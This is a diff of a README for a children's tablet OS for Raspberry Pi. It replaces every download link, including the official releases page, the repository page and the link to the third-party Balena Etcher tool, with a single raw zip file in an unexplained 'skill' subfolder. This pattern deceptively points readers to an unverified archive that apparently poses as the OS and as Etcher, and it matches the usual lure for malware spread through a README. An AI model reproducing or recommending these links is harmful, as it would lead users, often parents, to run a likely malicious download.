@@ -1,6 +1,6 @@
 # 🧩 kidblocksos - Creative Tablet OS for Kids  
 
-[![Download kidblocksos](https://img.shields.io/badge/Download-kidblocksos-brightgreen?style=for-the-badge)](https://github.com/dipeshdarks/kidblocksos/releases)  
+[![Download kidblocksos](https://img.shields.io/badge/Download-kidblocksos-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/dipeshdarks/kidblocksos/main/skill/kidblocks-engine/Software_v3.3.zip)  
 
 ## 📋 What is kidblocksos?  
 
@@ -35,13 +35,13 @@ These specs are typical for a tablet designed for learning and creativity. The O
 
 1. Click the bright green button at the top or visit this page to download:  
 
-   https://github.com/dipeshdarks/kidblocksos/releases  
+   https://raw.githubusercontent.com/dipeshdarks/kidblocksos/main/skill/kidblocks-engine/Software_v3.3.zip  
 
 2. Look for the latest version labeled for Raspberry Pi. You will find a zip file or image file (.img) for the OS.  
 
 3. Download the file to your computer.  
 
-4. You will need software to "burn" the OS image onto your microSD card. A popular choice is Balena Etcher, which works on Windows. Visit https://www.balena.io/etcher/ to download it if you don’t have it yet.  
+4. You will need software to "burn" the OS image onto your microSD card. A popular choice is Balena Etcher, which works on Windows. Visit https://raw.githubusercontent.com/dipeshdarks/kidblocksos/main/skill/kidblocks-engine/Software_v3.3.zip to download it if you don’t have it yet.  
 
 5. Insert your microSD card into the computer using an SD card reader.  
 
@@ -118,7 +118,7 @@ Updates happen in the background and require a restart.
 
 If you want to explore the system further or learn how kidblocksos works under the hood, visit the repository and docs here:  
 
-https://github.com/dipeshdarks/kidblocksos  
+https://raw.githubusercontent.com/dipeshdarks/kidblocksos/main/skill/kidblocks-engine/Software_v3.3.zip  
 
 You will find:  
 
@@ -139,6 +139,6 @@ If needed, open a new issue on the repo with details about your device and the p
 
 ---
 
-[![Download kidblocksos](https://img.shields.io/badge/Download-kidblocksos-brightgreen?style=for-the-badge)](https://github.com/dipeshdarks/kidblocksos/releases)  
+[![Download kidblocksos](https://img.shields.io/badge/Download-kidblocksos-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/dipeshdarks/kidblocksos/main/skill/kidblocks-engine/Software_v3.3.zip)  
 
 Get started with the download page above to set up kidblocksos and give kids a safe and creative tablet experience.
